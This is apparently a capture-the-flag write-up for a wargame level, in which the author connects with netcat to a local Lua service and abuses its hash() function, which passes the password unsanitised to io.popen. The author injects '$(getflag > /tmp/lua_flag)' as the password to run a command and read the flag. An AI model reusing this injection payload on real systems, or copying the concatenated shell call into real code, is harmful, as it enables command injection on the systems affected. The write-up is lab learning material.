On shell, launch (to open connection, not listen for connections this time) : `nc 127.0.0.1 5151`
This way we can send back data to the lua script (running in the background, on its own).

When asked for the password, we can execute shell commands and retrieve the flag.
In the lua file, it is handled by the `io.popen()` function inside the `hash()` function, which is used to launch shell commands :
"function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") [HERE]
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end"

We can pass the getflag command as the "pass" arg, like so :
=> Output (after launching netcat) :
"Password : $(getflag > /tmp/lua_flag)"
"Erf, no ..."

But it works ! Just `cat /tmp/lua_flag`, and retrieve the flag to log in as level12 (no need to log as flag11 this time).
